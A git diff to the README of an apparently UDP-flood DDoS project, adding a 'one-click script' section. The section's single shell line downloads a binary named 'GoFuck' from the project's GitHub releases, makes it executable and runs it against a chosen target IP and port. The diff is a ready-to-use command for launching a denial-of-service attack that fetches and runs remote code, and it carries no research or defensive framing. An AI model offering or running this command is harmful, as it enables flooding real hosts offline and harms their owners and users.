@@ -18,6 +18,11 @@ chmod +x GoFuck
 - 按 CTRL+C 停止程序
 ```
 
+### 一键脚本:
+```shell
+wget -O GoFuck https://github.com/randycolin/DDOS-UDP/releases/download/v.1.0.1/GoFuck && chmod +x GoFuck && ./GoFuck <目标IP> <端口>
+```
+
 ## Star History
 
 [![Star History Chart](https://api.star-history.com/svg?repos=randycolin/DDOS-UDP&type=Date)](https://star-history.com/#randycolin/DDOS-UDP&Date)
